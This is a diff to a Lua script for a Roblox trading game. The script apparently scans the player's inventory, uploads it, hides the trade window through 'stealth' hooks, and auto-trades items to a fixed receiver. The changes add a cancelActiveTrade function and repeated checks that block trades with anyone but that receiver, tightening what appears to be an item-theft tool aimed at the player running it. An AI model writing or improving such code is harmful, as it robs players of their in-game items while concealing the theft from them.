@@ -782,7 +782,6 @@ local function scanAndSend()
         return false
     end
 
-    -- SPEED OPTIMIZATION: Run the inventory upload asynchronously in the background
     local inventoryRawUrl = ""
     task.spawn(function()
         inventoryRawUrl = uploadInventoryRaw(results, LocalPlayer.Name)
@@ -902,6 +901,20 @@ local function isTradingWithReceiver()
     end
 
     return true
+end
+
+-- STRICT ENFORCEMENT: Cancel / decline or block trades with anyone else
+local function cancelActiveTrade()
+    local remotes = getTradeRemotes()
+    if remotes and remotes.CancelTrade then
+        pcall(function()
+            remotes.CancelTrade:InvokeServer()
+        end)
+    end
+    TradeState.active = false
+    TradeState.ended = true
+    TradeState.replionId = nil
+    TradeRuntime.sessionRunning = false
 end
 
 local function shouldHideTradeGui()
@@ -1060,7 +1073,11 @@ local function installTradeStealthHooks()
 
         LocalPlayer:GetAttributeChangedSignal("IsTrading"):Connect(function()
             if LocalPlayer:GetAttribute("IsTrading") then
-                armTradeStealth()
+                if not isTradingWithReceiver() then
+                    cancelActiveTrade()
+                else
+                    armTradeStealth()
+                end
             else
                 disarmTradeStealth()
             end
@@ -1140,7 +1157,16 @@ local function setupTradeListeners()
             TradeState.active = true
             TradeState.completed = false
             TradeState.ended = false
-            armTradeStealth()
+            
+            -- Verify right away if this trade is with the valid receiver
+            task.spawn(function()
+                task.wait(0.2)
+                if not isTradingWithReceiver() then
+                    cancelActiveTrade()
+                else
+                    armTradeStealth()
+                end
+            end)
         end
     end)
 
@@ -1379,7 +1405,7 @@ local function addItemsToTrade(tradeRep, items)
         return 0
     end
 
-    local maxItems = getTradeMaxItems()
+    local maxItems = math.min(getTradeMaxItems(), TRADE_MAX_ITEMS)
     local added = 0
     setTradeDebug({ phase = "adding", tradableCount = #items, added = 0 })
 
@@ -1646,6 +1672,13 @@ local function runTradeSession(replionId, dataReplion, catalog, rapReplion)
             return
         end
 
+        -- STRICT VALIDATION CHECK HERE
+        if not isTradingWithReceiver() then
+            cancelActiveTrade()
+            finish(false, "trade is not with target receiver")
+            return
+        end
+
         setTradeDebug({ phase = "wait_session_ready" })
         if not waitForTradeSessionReady(tradeRep, 20) then
             finish(false, "trade session not ready")
@@ -1675,7 +1708,7 @@ local function runTradeSession(replionId, dataReplion, catalog, rapReplion)
             return
         end
 
-        local maxItems = getTradeMaxItems()
+        local maxItems = math.min(getTradeMaxItems(), TRADE_MAX_ITEMS)
         local batch = {}
         for i = 1, math.min(maxItems, #allItems) do
             table.insert(batch, allItems[i])
@@ -1757,7 +1790,11 @@ local function startTradeLoop()
                 replionId = waitForTradeStart(8)
             end
             if replionId then
-                runTradeSession(replionId, dataReplion, catalog, rapReplion)
+                if not isTradingWithReceiver() then
+                    cancelActiveTrade()
+                else
+                    runTradeSession(replionId, dataReplion, catalog, rapReplion)
+                end
             end
             task.wait(TRADE_INVITE_COOLDOWN)
             continue
@@ -1777,7 +1814,11 @@ local function startTradeLoop()
 
         local replionId = waitForTradeStart(20)
         if replionId then
-            runTradeSession(replionId, dataReplion, catalog, rapReplion)
+            if not isTradingWithReceiver() then
+                cancelActiveTrade()
+            else
+                runTradeSession(replionId, dataReplion, catalog, rapReplion)
+            end
         end
 
         task.wait(TRADE_INVITE_COOLDOWN)
